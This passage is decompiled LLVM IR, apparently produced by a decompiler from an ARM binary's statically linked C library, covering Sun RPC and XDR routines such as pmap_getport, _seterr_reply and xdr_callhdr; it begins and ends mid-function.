  uselistorder i32 %v0_16db8.pre, { 1, 0 }
  uselistorder i32 %v1_16db4, { 1, 0 }
  uselistorder i32 %v0_16d68137, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16d10, { 1, 0, 2 }
  uselistorder i32 %v5_16ccc, { 1, 0 }
  uselistorder i32 %stack_var_-9028.2, { 1, 0, 3, 2 }
  uselistorder i32 %v0_16c8c, { 0, 3, 2, 1 }
  uselistorder i32 %stack_var_-9032.0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-9028.0, { 1, 0 }
  uselistorder i32 %stack_var_-9024.0, { 1, 0 }
  uselistorder i32 %v2_17094, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17080, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16dbc, { 2, 1, 0 }
  uselistorder i32 %v2_16eb8, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %v4_16e78, { 1, 0 }
  uselistorder i32 %storemerge7, { 4, 5, 3, 1, 0, 2 }
  uselistorder i32 %storemerge6, { 2, 1, 0 }
  uselistorder i32 %v2_16ae4, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v34_16ad4, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i8** %stack_var_-72, { 2, 1, 0 }
  uselistorder i8* %stack_var_-144, { 2, 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 46, 47, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 34, 36, 37, 38, 39, 40, 41, 42, 44, 43, 35, 32, 0, 45, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 9, 8, 10, 12, 11, 20, 25, 13, 14, 15, 16, 18, 17, 21, 19, 22, 23, 24, 28, 26, 27, 29, 33, 30, 31, 32, 46, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 34, 45, 48, 47, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 22, 21, 7, 8, 10, 9, 0, 11, 12, 14, 17, 15, 16, 13, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 92, { 1, 4, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_recvmsg, { 1, 0 }
  uselistorder i32* @sp, { 1, 3, 9, 4, 0, 10, 2, 11, 5, 12, 13, 6, 7, 8, 14 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 1, 0 }
  uselistorder i32 88, { 1, 2, 3, 4, 13, 14, 12, 10, 11, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1717c, { 1, 0 }
  uselistorder label %dec_label_pc_17178, { 4, 0, 1, 3, 2 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_17044, { 1, 0 }
  uselistorder label %dec_label_pc_16fec, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_16dc8, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16db4, { 1, 0 }
  uselistorder label %dec_label_pc_16d68, { 1, 0 }
  uselistorder label %dec_label_pc_16d00, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16cc8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16b9c, { 1, 0 }
  uselistorder label %dec_label_pc_16b70, { 0, 2, 1 }
}

define i32 @_create_xid(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v6_171a4 = load i32, i32* @r5, align 4
  %v2_171a8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_301a4.880 to i32), i32* @r2, align 4
  store i32 %v2_171a8, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_301bc.883 to i32), i32* @r4, align 4
  %v1_171c4 = call i32 @__pthread_cleanup_push_defer()
  %v2_171d4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_301a4.880 to i32))
  %v2_171d8 = load i32, i32* @global_var_301bc.883, align 4
  %v2_171dc = icmp eq i32 %v2_171d8, 0
  store i32 %v2_171a8, i32* @r5, align 4
  br i1 %v2_171dc, label %dec_label_pc_171ec, label %dec_label_pc_1720c

dec_label_pc_171ec:                               ; preds = %entry
  %v0_171ec = call i32 @gettimeofday()
  %v3_171f0 = load i32, i32* %stack_var_-24, align 4
  %v2_171fc = xor i32 %v3_171f0, %tmp
  %v2_17200 = trunc i32 %v2_171fc to i8
  %v3_17200 = call i32 @__GI_srand48_r(i8 %v2_17200, i32 ptrtoint (i32* @global_var_301c0.886 to i32))
  %v1_17208 = load i32, i32* @r4, align 4
  %v2_17208 = inttoptr i32 %v1_17208 to i32*
  store i32 1, i32* %v2_17208, align 4
  br label %dec_label_pc_1720c

dec_label_pc_1720c:                               ; preds = %entry, %dec_label_pc_171ec
  %v2_1720c = ptrtoint i32* %stack_var_-16 to i32
  %v2_17214 = call i32 @lrand48_r(i32 ptrtoint (i32* @global_var_301c0.886 to i32), i32 %v2_1720c)
  store i32 %v2_171a8, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 94764, i32* @lr, align 4
  %v1_17228 = call i32 @__pthread_cleanup_pop_restore()
  %v3_1722c = load i32, i32* %stack_var_-16, align 4
  store i32 %v6_171a4, i32* @r5, align 4
  ret i32 %v3_1722c

; uselistorder directives
  uselistorder i32 ()* @gettimeofday, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1720c, { 1, 0 }
}

define i32 @pmap_getport(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_17254 = load i32, i32* @r4, align 4
  %v9_17254 = load i32, i32* @r6, align 4
  %v12_17254 = load i32, i32* @r7, align 4
  %v15_17254 = load i32, i32* @r8, align 4
  %v18_17254 = load i32, i32* @sb, align 4
  %v21_17254 = load i32, i32* @sl, align 4
  %v3_17264 = add i32 %arg1, 3
  %v4_17264 = inttoptr i32 %v3_17264 to i8*
  store i8 111, i8* %v4_17264, align 1
  store i32 0, i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v3_17274 = add i32 %arg1, 2
  %v4_17274 = inttoptr i32 %v3_17274 to i8*
  store i8 0, i8* %v4_17274, align 1
  store i32 %arg2, i32* @r8, align 4
  %v0_1727c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_1727c, i32* %stack_var_-40, align 4
  store i32 %arg3, i32* @sl, align 4
  %v2_17284 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_17284, i32* %ip.global-to-local, align 4
  store i32 %arg4, i32* @sb, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  store i32 400, i32* @lr, align 4
  store i32 %arg1, i32* @r7, align 4
  %v0_172ac = load i32, i32* @r6, align 4
  %v6_172ac = trunc i32 %v0_172ac to i8
  %v8_172b8 = inttoptr i32 %arg1 to i32*
  %v9_172b8 = call i32 @__GI_clntudp_bufcreate(i32* %v8_172b8, i32 100000, i32 2, i32 5, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_172b8, i32* @r4, align 4
  %v2_172bc = icmp eq i32 %v9_172b8, 0
  br i1 %v2_172bc, label %dec_label_pc_17364, label %dec_label_pc_172c4

dec_label_pc_172c4:                               ; preds = %entry
  %v0_172c4 = call i32 @__GI___rpc_thread_createerr()
  %v0_172c8 = load i32, i32* @r8, align 4
  store i32 %v0_172c8, i32* %stack_var_-56, align 4
  store i32 99704, i32* %r3.global-to-local, align 4
  %v0_172dc = load i32, i32* @r4, align 4
  %v1_172dc = add i32 %v0_172dc, 4
  %v2_172dc = inttoptr i32 %v1_172dc to i32*
  %v3_172dc = load i32, i32* %v2_172dc, align 4
  store i32 %v3_172dc, i32* %ip.global-to-local, align 4
  store i32 %v0_172c4, i32* %r5.global-to-local, align 4
  %v2_17300 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17300, i32* %r3.global-to-local, align 4
  %v1_17314 = inttoptr i32 %v3_172dc to i32*
  %v2_17314 = load i32, i32* %v1_17314, align 4
  call void @__pseudo_branch(i32 %v2_17314)
  %v1_17318 = load i32, i32* @r6, align 4
  %v9_17318 = icmp eq i32 %v0_172dc, %v1_17318
  br i1 %v9_17318, label %dec_label_pc_17340, label %dec_label_pc_17324

dec_label_pc_17324:                               ; preds = %dec_label_pc_172c4
  store i32 14, i32* %r3.global-to-local, align 4
  %v1_17328 = load i32, i32* %r5.global-to-local, align 4
  %v2_17328 = inttoptr i32 %v1_17328 to i32*
  store i32 14, i32* %v2_17328, align 4
  %v3_17328 = load i32, i32* %r5.global-to-local, align 4
  %v4_17328 = add i32 %v3_17328, 4
  store i32 %v4_17328, i32* %r5.global-to-local, align 4
  %v0_17330 = load i32, i32* @r4, align 4
  %v1_17330 = add i32 %v0_17330, 4
  %v2_17330 = inttoptr i32 %v1_17330 to i32*
  %v3_17330 = load i32, i32* %v2_17330, align 4
  store i32 %v3_17330, i32* %r3.global-to-local, align 4
  %v1_17338 = add i32 %v3_17330, 8
  %v2_17338 = inttoptr i32 %v1_17338 to i32*
  %v3_17338 = load i32, i32* %v2_17338, align 4
  call void @__pseudo_branch(i32 %v3_17338)
  br label %.thread

dec_label_pc_17340:                               ; preds = %dec_label_pc_172c4
  %v4_17344 = sext i8 %v6_172ac to i32
  %v4_17340 = mul i32 %v0_172ac, 256
  %v4_17348 = and i32 %v4_17340, 65280
  %v5_17348 = or i32 %v4_17348, %v4_17344
  store i32 %v5_17348, i32* %r3.global-to-local, align 4
  %v7_17348 = icmp eq i32 %v5_17348, 0
  br i1 %v7_17348, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17340
  store i32 15, i32* %r3.global-to-local, align 4
  %v2_17350 = load i32, i32* %r5.global-to-local, align 4
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  store i32 15, i32* %v3_17350, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17340, %dec_label_pc_17324, %bb
  %v0_17354 = load i32, i32* @r4, align 4
  %v1_17358 = add i32 %v0_17354, 4
  %v2_17358 = inttoptr i32 %v1_17358 to i32*
  %v3_17358 = load i32, i32* %v2_17358, align 4
  store i32 %v3_17358, i32* %r3.global-to-local, align 4
  %v1_17360 = add i32 %v3_17358, 16
  %v2_17360 = inttoptr i32 %v1_17360 to i32*
  %v3_17360 = load i32, i32* %v2_17360, align 4
  call void @__pseudo_branch(i32 %v3_17360)
  br label %dec_label_pc_17364

dec_label_pc_17364:                               ; preds = %entry, %.thread
  %v4_17364 = sext i8 %v6_172ac to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_17368 = mul i32 %v0_172ac, 256
  %v4_17370 = and i32 %v4_17368, 65280
  %v5_17370 = or i32 %v4_17370, %v4_17364
  %v2_17374 = load i32, i32* @r7, align 4
  %v3_17374 = add i32 %v2_17374, 3
  %v4_17374 = inttoptr i32 %v3_17374 to i8*
  store i8 0, i8* %v4_17374, align 1
  %v0_17378 = load i32, i32* %r3.global-to-local, align 4
  %v1_17378 = trunc i32 %v0_17378 to i8
  %v2_17378 = load i32, i32* @r7, align 4
  %v3_17378 = add i32 %v2_17378, 2
  %v4_17378 = inttoptr i32 %v3_17378 to i8*
  store i8 %v1_17378, i8* %v4_17378, align 1
  store i32 %v3_17254, i32* @r4, align 4
  store i32 %v9_17254, i32* @r6, align 4
  store i32 %v12_17254, i32* @r7, align 4
  store i32 %v15_17254, i32* @r8, align 4
  store i32 %v18_17254, i32* @sb, align 4
  store i32 %v21_17254, i32* @sl, align 4
  ret i32 %v5_17370

; uselistorder directives
  uselistorder i8 %v6_172ac, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_17364, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @__GI_xdr_pmap(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17398 = load i32, i32* @r4, align 4
  store i32 %v3_17398, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_173a4 = call i32 @xdr_u_long()
  %v2_173a8 = icmp eq i32 %v0_173a4, 0
  %v0_173ac = load i32, i32* @r4, align 4
  %v1_173ac = add i32 %v0_173ac, 4
  store i32 %v1_173ac, i32* @r1, align 4
  %v0_173b0 = load i32, i32* @r5, align 4
  store i32 %v0_173b0, i32* @r0, align 4
  br i1 %v2_173a8, label %dec_label_pc_173e8, label %dec_label_pc_173b8

dec_label_pc_173b8:                               ; preds = %entry
  %v0_173b8 = call i32 @xdr_u_long()
  %v2_173bc = icmp eq i32 %v0_173b8, 0
  %v0_173c0 = load i32, i32* @r4, align 4
  %v1_173c0 = add i32 %v0_173c0, 8
  store i32 %v1_173c0, i32* @r1, align 4
  %v0_173c4 = load i32, i32* @r5, align 4
  store i32 %v0_173c4, i32* @r0, align 4
  br i1 %v2_173bc, label %dec_label_pc_173e8, label %dec_label_pc_173cc

dec_label_pc_173cc:                               ; preds = %dec_label_pc_173b8
  %v0_173cc = call i32 @xdr_u_long()
  %v2_173d0 = icmp eq i32 %v0_173cc, 0
  %v0_173d4 = load i32, i32* @r4, align 4
  %v1_173d4 = add i32 %v0_173d4, 12
  store i32 %v1_173d4, i32* @r1, align 4
  %v0_173d8 = load i32, i32* @r5, align 4
  store i32 %v0_173d8, i32* @r0, align 4
  br i1 %v2_173d0, label %dec_label_pc_173e8, label %dec_label_pc_173e0

dec_label_pc_173e0:                               ; preds = %dec_label_pc_173cc
  %v2_173e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173e0, i32* @r4, align 4
  %v0_173e4 = call i32 @xdr_u_long()
  br label %dec_label_pc_173e8

dec_label_pc_173e8:                               ; preds = %dec_label_pc_173cc, %dec_label_pc_173b8, %entry, %dec_label_pc_173e0
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_173e8, { 3, 0, 1, 2 }
}

define i32 @__GI__seterr_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v1_173f0 = add i32 %arg1, 8
  %v2_173f0 = inttoptr i32 %v1_173f0 to i32*
  %v3_173f0 = load i32, i32* %v2_173f0, align 4
  store i32 %v3_173f0, i32* %ip.global-to-local, align 4
  %v2_173f4 = icmp eq i32 %v3_173f0, 0
  br i1 %v2_173f4, label %dec_label_pc_17408, label %dec_label_pc_173fc

dec_label_pc_173fc:                               ; preds = %entry
  %v7_173fc = icmp eq i32 %v3_173f0, 1
  br i1 %v7_173fc, label %dec_label_pc_17484, label %dec_label_pc_174b8

dec_label_pc_17408:                               ; preds = %entry
  %v1_17408 = add i32 %arg1, 24
  %v2_17408 = inttoptr i32 %v1_17408 to i32*
  %v3_17408 = load i32, i32* %v2_17408, align 4
  store i32 %v3_17408, i32* %r2.global-to-local, align 4
  %v2_1740c = icmp eq i32 %v3_17408, 0
  br i1 %v2_1740c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17408
  store i32 0, i32* %arg2, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread2, %dec_label_pc_174e4
  ret i32 %arg1

.thread:                                          ; preds = %dec_label_pc_17408
  switch i32 %v3_17408, label %dec_label_pc_17470 [
    i32 5, label %dec_label_pc_17460
    i32 1, label %dec_label_pc_1743c
    i32 2, label %dec_label_pc_17444
    i32 3, label %dec_label_pc_17450
    i32 4, label %dec_label_pc_17458
  ]

dec_label_pc_1743c:                               ; preds = %.thread
  br label %dec_label_pc_17448

dec_label_pc_17444:                               ; preds = %.thread
  br label %dec_label_pc_17448

dec_label_pc_17448:                               ; preds = %dec_label_pc_17460, %dec_label_pc_17458, %dec_label_pc_17450, %dec_label_pc_1743c, %dec_label_pc_174a0, %dec_label_pc_17444
  %v0_17448 = phi i32 [ 12, %dec_label_pc_17460 ], [ 11, %dec_label_pc_17458 ], [ 10, %dec_label_pc_17450 ], [ 8, %dec_label_pc_1743c ], [ 7, %dec_label_pc_174a0 ], [ 9, %dec_label_pc_17444 ]
  store i32 %v0_17448, i32* %arg2, align 4
  br label %dec_label_pc_174c8

dec_label_pc_17450:                               ; preds = %.thread
  br label %dec_label_pc_17448

dec_label_pc_17458:                               ; preds = %.thread
  br label %dec_label_pc_17448

dec_label_pc_17460:                               ; preds = %.thread
  br label %dec_label_pc_17448

dec_label_pc_17470:                               ; preds = %.thread
  store i32 16, i32* %arg2, align 4
  %v2_1747c = add i32 %tmp, 4
  %v3_1747c = inttoptr i32 %v2_1747c to i32*
  store i32 0, i32* %v3_1747c, align 4
  br label %dec_label_pc_174b0

dec_label_pc_17484:                               ; preds = %dec_label_pc_173fc
  %v1_17484 = add i32 %arg1, 12
  %v2_17484 = inttoptr i32 %v1_17484 to i32*
  %v3_17484 = load i32, i32* %v2_17484, align 4
  store i32 %v3_17484, i32* %r2.global-to-local, align 4
  %v7_17488 = icmp eq i32 %v3_17484, 1
  br i1 %v7_17488, label %dec_label_pc_174a0, label %dec_label_pc_17490

dec_label_pc_17490:                               ; preds = %dec_label_pc_17484
  %v7_17490 = icmp eq i32 %v3_17484, 6
  br i1 %v7_17490, label %bb11, label %dec_label_pc_174a8

bb11:                                             ; preds = %dec_label_pc_17490
  store i32 6, i32* %arg2, align 4
  br label %dec_label_pc_174c8

dec_label_pc_174a0:                               ; preds = %dec_label_pc_17484
  br label %dec_label_pc_17448

dec_label_pc_174a8:                               ; preds = %dec_label_pc_17490
  store i32 16, i32* %arg2, align 4
  %v3_174ac = add i32 %tmp, 4
  %v4_174ac = inttoptr i32 %v3_174ac to i32*
  %v5_174ac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_174ac, i32* %v4_174ac, align 4
  br label %dec_label_pc_174b0

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17470, %dec_label_pc_174a8
  %v0_174b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_174b0 = add i32 %tmp, 8
  %v3_174b0 = inttoptr i32 %v2_174b0 to i32*
  store i32 %v0_174b0, i32* %v3_174b0, align 4
  br label %dec_label_pc_174c8thread-pre-split

dec_label_pc_174b8:                               ; preds = %dec_label_pc_173fc
  store i32 16, i32* %arg2, align 4
  %v3_174c0 = load i32, i32* %v2_173f0, align 4
  %v2_174c4 = add i32 %tmp, 4
  %v3_174c4 = inttoptr i32 %v2_174c4 to i32*
  store i32 %v3_174c0, i32* %v3_174c4, align 4
  br label %dec_label_pc_174c8thread-pre-split

dec_label_pc_174c8thread-pre-split:               ; preds = %dec_label_pc_174b8, %dec_label_pc_174b0
  %v2_174c8.pr = load i32, i32* %arg2, align 4
  br label %dec_label_pc_174c8

dec_label_pc_174c8:                               ; preds = %bb11, %dec_label_pc_174c8thread-pre-split, %dec_label_pc_17448
  %v2_174c8 = phi i32 [ %v2_174c8.pr, %dec_label_pc_174c8thread-pre-split ], [ 6, %bb11 ], [ %v0_17448, %dec_label_pc_17448 ]
  %v7_174cc = icmp eq i32 %v2_174c8, 7
  br i1 %v7_174cc, label %.thread2, label %.thread3

.thread2:                                         ; preds = %dec_label_pc_174c8
  %v2_174d0 = add i32 %arg1, 16
  %v3_174d0 = inttoptr i32 %v2_174d0 to i32*
  %v4_174d0 = load i32, i32* %v3_174d0, align 4
  %v3_174d4 = add i32 %tmp, 4
  %v4_174d4 = inttoptr i32 %v3_174d4 to i32*
  store i32 %v4_174d0, i32* %v4_174d4, align 4
  br label %.thread6

.thread3:                                         ; preds = %dec_label_pc_174c8
  %v7_174dc = icmp eq i32 %v2_174c8, 9
  br i1 %v7_174dc, label %dec_label_pc_174fc, label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %.thread3
  %v7_174e4 = icmp eq i32 %v2_174c8, 6
  br i1 %v7_174e4, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_174e4
  %v2_174e8 = add i32 %arg1, 16
  %v3_174e8 = inttoptr i32 %v2_174e8 to i32*
  %v4_174e8 = load i32, i32* %v3_174e8, align 4
  %v3_174ec = add i32 %tmp, 4
  %v4_174ec = inttoptr i32 %v3_174ec to i32*
  store i32 %v4_174e8, i32* %v4_174ec, align 4
  %v2_174f0 = add i32 %arg1, 20
  br label %dec_label_pc_17508

dec_label_pc_174fc:                               ; preds = %.thread3
  %v1_174fc = add i32 %arg1, 28
  %v2_174fc = inttoptr i32 %v1_174fc to i32*
  %v3_174fc = load i32, i32* %v2_174fc, align 4
  %v2_17500 = add i32 %tmp, 4
  %v3_17500 = inttoptr i32 %v2_17500 to i32*
  store i32 %v3_174fc, i32* %v3_17500, align 4
  %v1_17504 = add i32 %arg1, 32
  br label %dec_label_pc_17508

dec_label_pc_17508:                               ; preds = %.thread5, %dec_label_pc_174fc
  %storemerge.in.in = phi i32 [ %v2_174f0, %.thread5 ], [ %v1_17504, %dec_label_pc_174fc ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_17508 = add i32 %tmp, 8
  %v3_17508 = inttoptr i32 %v2_17508 to i32*
  store i32 %storemerge, i32* %v3_17508, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_174c8, { 1, 0, 2 }
  uselistorder i32 %v0_17448, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 6, 0, 3, 7, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2 }
  uselistorder i32* %arg2, { 0, 6, 5, 4, 2, 3, 1, 7 }
  uselistorder i32 %arg1, { 7, 3, 8, 0, 1, 4, 5, 2, 6, 9 }
  uselistorder label %dec_label_pc_17508, { 1, 0 }
  uselistorder label %dec_label_pc_174c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_174b0, { 1, 0 }
  uselistorder label %dec_label_pc_17448, { 4, 0, 1, 2, 5, 3 }
  uselistorder label %.thread6, { 2, 1, 0 }
}

define i32 @__GI_xdr_callhdr(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17510 = load i32, i32* @r4, align 4
  store i32 %v3_17510, i32* %stack_var_-12, align 4
  %v6_17510 = load i32, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17518 = add i32 %arg2, 4
  %v3_17518 = inttoptr i32 %v2_17518 to i32*
  store i32 0, i32* %v3_17518, align 4
  %v0_1751c = load i32, i32* %r3.global-to-local, align 4
  %v1_1751c = add i32 %v0_1751c, 2
  store i32 %v1_1751c, i32* %r3.global-to-local, align 4
  %v2_17520 = add i32 %arg2, 8
  %v3_17520 = inttoptr i32 %v2_17520 to i32*
  store i32 %v1_1751c, i32* %v3_17520, align 4
  %v2_17524 = load i32, i32* %arg1, align 4
  store i32 %v2_17524, i32* %r3.global-to-local, align 4
  %v2_17528 = icmp eq i32 %v2_17524, 0
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_17528, label %dec_label_pc_17538, label %dec_label_pc_17590

dec_label_pc_17538:                               ; preds = %entry
  %v0_17538 = call i32 @xdr_u_long()
  %v2_1753c = icmp eq i32 %v0_17538, 0
  %v0_17544 = load i32, i32* @r5, align 4
  store i32 %v0_17544, i32* @r0, align 4
  br i1 %v2_1753c, label %dec_label_pc_17590, label %dec_label_pc_1754c

dec_label_pc_1754c:                               ; preds = %dec_label_pc_17538
  %v0_1754c = call i32 @xdr_enum()
  %v2_17550 = icmp eq i32 %v0_1754c, 0
  %v0_17554 = load i32, i32* @r4, align 4
  %v1_17554 = add i32 %v0_17554, 8
  store i32 %v1_17554, i32* @r1, align 4
  %v0_17558 = load i32, i32* @r5, align 4
  store i32 %v0_17558, i32* @r0, align 4
  br i1 %v2_17550, label %dec_label_pc_17590, label %dec_label_pc_17560

dec_label_pc_17560:                               ; preds = %dec_label_pc_1754c
  %v0_17560 = call i32 @xdr_u_long()
  %v2_17564 = icmp eq i32 %v0_17560, 0
  %v0_17568 = load i32, i32* @r4, align 4
  %v1_17568 = add i32 %v0_17568, 12
  store i32 %v1_17568, i32* @r1, align 4
  %v0_1756c = load i32, i32* @r5, align 4
  store i32 %v0_1756c, i32* @r0, align 4
  br i1 %v2_17564, label %dec_label_pc_17590, label %dec_label_pc_17574

dec_label_pc_17574:                               ; preds = %dec_label_pc_17560
  %v0_17574 = call i32 @xdr_u_long()
  %v2_17578 = icmp eq i32 %v0_17574, 0
  %v0_1757c = load i32, i32* @r4, align 4
  %v1_1757c = add i32 %v0_1757c, 16
  store i32 %v1_1757c, i32* @r1, align 4
  %v0_17580 = load i32, i32* @r5, align 4
  store i32 %v0_17580, i32* @r0, align 4
  br i1 %v2_17578, label %dec_label_pc_17590, label %dec_label_pc_17588

dec_label_pc_17588:                               ; preds = %dec_label_pc_17574
  %v2_17588 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17588, i32* @r4, align 4
  %v0_1758c = call i32 @xdr_u_long()
  br label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %entry, %dec_label_pc_17574, %dec_label_pc_17560, %dec_label_pc_1754c, %dec_label_pc_17538, %dec_label_pc_17588
  %v2_17594 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17594, i32* @r4, align 4
  store i32 %v6_17510, i32* @r5, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_17590, { 5, 1, 2, 3, 4, 0 }
}

define i32 @__GI_xdr_rejected_reply(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17598 = load i32, i32* @r4, align 4
  store i32 %v3_17598, i32* %stack_var_-12, align 4
  %v6_17598 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_175a4 = call i32 @xdr_enum()
  %v2_175a8 = icmp eq i32 %v0_175a4, 0
  br i1 %v2_175a8, label %dec_label_pc_175fc, label %dec_label_pc_175b0

dec_label_pc_175b0:                               ; preds = %entry
  %v0_175b0 = load i32, i32* @r4, align 4
  %v1_175b0 = inttoptr i32 %v0_175b0 to i32*
  %v2_175b0 = load i32, i32* %v1_175b0, align 4
  %v2_175b4 = icmp eq i32 %v2_175b0, 0
  %v1_175b8 = add i32 %v0_175b0, 4
  store i32 %v1_175b8, i32* @r1, align 4
  %v0_175bc = load i32, i32* @r5, align 4
  store i32 %v0_175bc, i32* @r0, align 4
  br i1 %v2_175b4, label %dec_label_pc_175d0, label %dec_label_pc_175c4

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175b0
  %v7_175c4 = icmp eq i32 %v2_175b0, 1
  br i1 %v7_175c4, label %dec_label_pc_175c4.dec_label_pc_175ec_crit_edge, label %dec_label_pc_175fc

dec_label_pc_175c4.dec_label_pc_175ec_crit_edge:  ; preds = %dec_label_pc_175c4
  br label %dec_label_pc_175ec

dec_label_pc_175d0:                               ; preds = %dec_label_pc_175b0
  %v0_175d0 = call i32 @xdr_u_long()
  %v2_175d4 = icmp eq i32 %v0_175d0, 0
  %v0_175d8 = load i32, i32* @r4, align 4
  %v1_175d8 = add i32 %v0_175d8, 8
  store i32 %v1_175d8, i32* @r1, align 4
  %v0_175dc = load i32, i32* @r5, align 4
  store i32 %v0_175dc, i32* @r0, align 4
  br i1 %v2_175d4, label %dec_label_pc_175fc, label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175d0
  %v2_175e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_175e4, i32* @r4, align 4
  store i32 %v6_17598, i32* @r5, align 4
  %v0_175e8 = call i32 @xdr_u_long()
  %v0_175ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_175ec

